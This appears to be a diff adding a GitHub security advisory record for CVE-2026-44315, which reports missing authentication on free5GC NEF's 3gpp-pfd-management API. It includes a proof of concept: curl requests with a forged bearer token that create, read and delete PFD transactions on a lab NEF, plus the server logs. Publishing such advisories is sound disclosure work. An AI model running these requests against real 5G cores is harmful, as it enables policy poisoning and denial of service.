@@ -1,0 +1,53 @@
+{
+  "id": "GHSA-5f62-53r8-qrqf",
+  "modified": "2026-05-08T22:47:23.688847Z",
+  "published": "2026-05-08T22:39:16Z",
+  "aliases": [
+    "CVE-2026-44315"
+  ],
+  "summary": "free5GC's NEF 3gpp-pfd-management API is unauthenticated; forged bearer tokens can create, read, and delete PFD transactions",
+  "details": "### Summary\nfree5GC's NEF mounts the `3gpp-pfd-management` API without inbound OAuth2/bearer-token authorization. A network attacker who can reach NEF on the SBI can create, read, and delete PFD-management transaction state with a forged or arbitrary bearer token (e.g. `Authorization: Bearer not-a-real-token`). The route group is also reachable even when the running config's `ServiceList` does not declare it, so operators who think they disabled the service via config are still exposed.\n\n### Details\nValidated against the NEF container in the official Docker compose lab.\n- Source repo tag: `v4.2.1`\n- Running Docker image: `free5gc/nef:v4.2.0`\n- Runtime NEF commit: `5ce35eab`\n- Docker validation date: 2026-03-11\n\nNEF advertises `OAuth2 setting receive from NRF: true`, and its `ServiceList` only declares `nnef-pfdmanagement` and `nnef-oam`. Despite that, the `3gpp-pfd-management` route group is mounted and reachable with no inbound auth middleware.\n\nCode evidence (paths in `free5gc/nef`):\n- Route group mounted without auth middleware: `NFs/nef/internal/sbi/server.go:52`\n- Transaction routes exposed at `/:scsAsID/transactions` and `/:scsAsID/transactions/:transID`: `NFs/nef/internal/sbi/api_pfd.go:13`\n- Create handler still contains `// TODO: Authorize the AF`: `NFs/nef/internal/sbi/processor/pfd.go:70`\n- POST allocates a new PFD transaction and writes to UDR: `NFs/nef/internal/sbi/processor/pfd.go:63`\n- GET reads transaction state: `NFs/nef/internal/sbi/processor/pfd.go:189`\n- DELETE removes transaction state: `NFs/nef/internal/sbi/processor/pfd.go:328`\n- NEF context only exposes outbound token acquisition (`GetTokenCtx`); there is no inbound authorization path: `NFs/nef/internal/context/nef_context.go:153`\n- Config validation only allows `nnef-pfdmanagement` and `nnef-oam`: `NFs/nef/pkg/factory/config.go:126`\n\n### PoC\nReproduced end-to-end against the running NEF at `http://10.100.200.19:8000` using a fabricated bearer token.\n\n1. Seed an AF context (also accepted with forged token):\n```\ncurl -i \\\n  -H 'Authorization: Bearer not-a-real-token' \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"afServiceId\":\"svc-seed2\",\"afAppId\":\"app-seed2\",\"dnn\":\"internet\",\"snssai\":{\"sst\":1,\"sd\":\"010203\"},\"anyUeInd\":true,\"trafficFilters\":[{\"flowId\":1,\"flowDescriptions\":[\"permit out ip from 192.0.2.31 to 198.51.100.0/24\"]}],\"trafficRoutes\":[{\"dnai\":\"mec-seed2\",\"routeInfo\":{\"ipv4Addr\":\"10.60.0.1\",\"portNumber\":0}}]}' \\\n  http://10.100.200.19:8000/3gpp-traffic-influence/v1/af-poc-pfd2/subscriptions\n```\n\n2. CREATE PFD transaction with forged token -\u003e `201 Created`:\n```\ncurl -i \\\n  -H 'Authorization: Bearer not-a-real-token' \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"pfdDatas\":{\"app-poc-pfd2\":{\"externalAppId\":\"app-poc-pfd2\",\"pfds\":{\"pfd-poc\":{\"pfdId\":\"pfd-poc\",\"urls\":[\"^http://poc.example.com(/\\\\\\\\S*)?$\"]}}}}}' \\\n  http://10.100.200.19:8000/3gpp-pfd-management/v1/af-poc-pfd2/transactions\n```\n\n3. READ -\u003e `200 OK`:\n```\ncurl -i -H 'Authorization: Bearer not-a-real-token' \\\n  http://10.100.200.19:8000/3gpp-pfd-management/v1/af-poc-pfd2/transactions/1\n```\n\n4. DELETE -\u003e `204 No Content`:\n```\ncurl -i -X DELETE -H 'Authorization: Bearer not-a-real-token' \\\n  http://10.100.200.19:8000/3gpp-pfd-management/v1/af-poc-pfd2/transactions/1\n```\n\n5. READ again -\u003e `404 PFD transaction not found`, confirming state was actually deleted.\n\nNEF container logs (`docker logs nef`) show the requests reaching business handlers and returning success codes:\n```\n[INFO][NEF][PFDMng] PostPFDManagementTransactions - scsAsID[af-poc-pfd2]\n[INFO][NEF][GIN] | 201 | POST   | /3gpp-pfd-management/v1/af-poc-pfd2/transactions\n[INFO][NEF][PFDMng] GetIndividualPFDManagementTransaction - scsAsID[af-poc-pfd2], transID[1]\n[INFO][NEF][GIN] | 200 | GET    | /3gpp-pfd-management/v1/af-poc-pfd2/transactions/1\n[INFO][NEF][PFDMng] DeleteIndividualPFDManagementTransaction - scsAsID[af-poc-pfd2], transID[1]\n[INFO][NEF][GIN] | 204 | DELETE | /3gpp-pfd-management/v1/af-poc-pfd2/transactions/1\n```\n\n### Impact\nMissing inbound authentication (CWE-306) and authorization (CWE-862) on a critical SBI surface in NEF. Any party that can reach NEF on the SBI network can:\n- Create attacker-controlled PFD transactions (which are written to UDR), poisoning policy state used downstream by SMF/UPF for traffic classification.\n- Read existing PFD transactions, leaking AF-supplied policy data.\n- Delete PFD transactions, denying service to legitimately provisioned application detection rules.\n\nThe PFD-management route group is also reachable even when the runtime `ServiceList` does not declare it, so operators relying on `ServiceList` to disable the service do not actually get that protection.\n\nAffected: free5gc \u003c=v4.2.1.\n\nUpstream issue: https://github.com/free5gc/free5gc/issues/858\nUpstream fix: https://github.com/free5gc/nef/pull/23",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/free5gc/nef",
+        "purl": "pkg:golang/github.com/free5gc/nef"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "1.2.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-5f62-53r8-qrqf/GHSA-5f62-53r8-qrqf.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/security/advisories/GHSA-5f62-53r8-qrqf"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/issues/858"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/nef/pull/23"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/free5gc/free5gc"
+    }
+  ]
+}
